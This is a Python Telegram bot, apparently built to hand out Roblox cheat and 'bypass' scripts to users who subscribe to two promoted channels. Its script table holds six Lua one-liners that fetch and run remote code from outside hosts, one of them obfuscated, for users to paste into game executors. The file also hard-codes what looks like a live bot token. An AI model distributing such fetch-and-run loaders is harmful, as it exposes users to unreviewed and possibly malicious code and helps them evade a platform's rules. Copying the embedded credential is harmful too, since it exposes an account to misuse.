import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandObject
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.default import DefaultBotProperties

# =============================================
# НАСТРОЙКИ БОТА
# =============================================
BOT_TOKEN = "8386985377:AAFKyH9xfQLrQsrs9YpZQ4Cj8NuJ9pOW8FI"
# Каналы для проверки подписки (бот должен быть админом!)
REQUIRED_CHANNELS = ["@passByscirpt", "@bekascript"]

# Ссылки на каналы для кнопок
CHANNEL_LINKS = {
    "passbyscript": "https://t.me/passByscirpt",
    "bekascript": "https://t.me/bekascript", 
}

# База данных скриптов
SCRIPTS_DB = {
    "dead-rails": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse101/CustomScripts/refs/heads/master/GrowAGarden", true))()',
    "mm2": 'getgenv().mainKey = "nil"; local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()',
    "ink-game": ' loadstring(game:HttpGet("https://raw.githubusercontent.com/eikikrkr-ux/bypasok/refs/heads/main/ok"))() ',
    "stealbRainrot": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Kurdhub"))()',
    "99-nights-in-the-forest": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/nouralddin-abdullah/99-night/refs/heads/main/main-en.lua"))()',
    "AnimalSimulator": 'loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/fcef5e88349466d80f524cc610f4695e69e71d6153048167c52c59ea7e7e4167/download"))()',
}

# =============================================
# ИНИЦИАЛИЗАЦИЯ БОТА
# =============================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# =============================================
# ПРОВЕРКА ПОДПИСКИ НА КАНАЛЫ
# =============================================
async def check_subscription(user_id: int) -> bool:
    """
    Проверяет, подписан ли пользователь на все каналы
    Бот должен быть администратором в этих каналах!
    """
    for channel in REQUIRED_CHANNELS:
        try:
            chat_member = await bot.get_chat_member(chat_id=channel, user_id=user_id)
            
            if chat_member.status not in ["member", "administrator", "creator"]:
                return False
                
        except Exception as e:
            print(f"Ошибка проверки канала {channel}: {e}")
            return False
    
    return True

# =============================================
# КЛАВИАТУРЫ
# =============================================
def get_subscription_keyboard(script_key: str):
    """Клавиатура для подписки на каналы"""
    keyboard = InlineKeyboardBuilder()
    
    # Кнопки подписки на каналы
    keyboard.button(text="📢 PassBy Script", url=CHANNEL_LINKS["passbyscript"])
    keyboard.button(text="📢 Bekascript", url=CHANNEL_LINKS["bekascript"])
    
    # Кнопка проверки подписки
    keyboard.button(text="✅ Я подписался", callback_data=f"check_{script_key}")
    
    return keyboard.adjust(1).as_markup()

def get_more_scripts_keyboard():
    """Кнопка 'Получить больше скриптов' после выдачи скрипта"""
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="🎮 Получить больше скриптов", url=CHANNEL_LINKS["bekascript"])
    return keyboard.as_markup()

# =============================================
# ОБРАБОТЧИКИ СООБЩЕНИЙ
# =============================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message, command: CommandObject):
    """Обработчик команды /start"""
    
    # Приветственное сообщение
    welcome_text = (
        "Приветствую в TheRobloxBypass!\n\n"
        "Данный бот создан для обхода и для быстрого получение ключа на вашем инжекторе!\n\n"
        "Туториал как пользоваться ботом: https://youtu.be/59kuQ-Uj1c4\n\n"
        "Данный бот создан при поддержке:\n"
        "t.me/passByscirpt; t.me/bekascript\n\n"
        "🔐 Используйте специальные ссылки для получения скриптов!"
    )

    # Если есть параметр в ссылке (прямой запрос скрипта)
    if command.args and command.args in SCRIPTS_DB:
        script_key = command.args
        user_id = message.from_user.id
        
        # Проверяем подписку
        if await check_subscription(user_id):
            # Выдаем скрипт
            script_code = SCRIPTS_DB[script_key]
            response_text = f"<b>🎉 Ваш скрипт {script_key.upper()} готов!</b>\n\n<code>{script_code}</code>"
            await message.answer(response_text, reply_markup=get_more_scripts_keyboard())
        else:
            # Просим подписаться
            await message.answer(
                "🔒 <b>Для получения скрипта необходимо подписаться на наши каналы:</b>",
                reply_markup=get_subscription_keyboard(script_key)
            )
    else:
        # Просто приветствие без ссылок на скрипты
        await message.answer(welcome_text)

@dp.callback_query(F.data.startswith("check_"))
async def check_subscription_callback(callback: types.CallbackQuery):
    """Проверка подписки после нажатия 'Я подписался'"""
    script_key = callback.data.replace("check_", "")
    user_id = callback.from_user.id
    
    if await check_subscription(user_id):
        # Выдаем скрипт
        script_code = SCRIPTS_DB[script_key]
        response_text = f"<b>🎉 Ваш скрипт {script_key.upper()} готов!</b>\n\n<code>{script_code}</code>"
        await callback.message.edit_text(response_text, reply_markup=get_more_scripts_keyboard())
    else:
        await callback.answer("❌ Вы не подписаны на все каналы!", show_alert=True)

# =============================================
# ЗАПУСК БОТА
# =============================================
async def main():
    logging.basicConfig(level=logging.INFO)
    
    # Проверяем что бот работает
    bot_user = await bot.get_me()
    print(f"✅ Бот @{bot_user.username} запущен!")
    print("📋 Доступные скрипты:")
    
    # Показываем ссылки только в консоли (пользователи их не увидят)
    for script_key in SCRIPTS_DB.keys():
        print(f"t.me/{bot_user.username}?start={script_key}")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
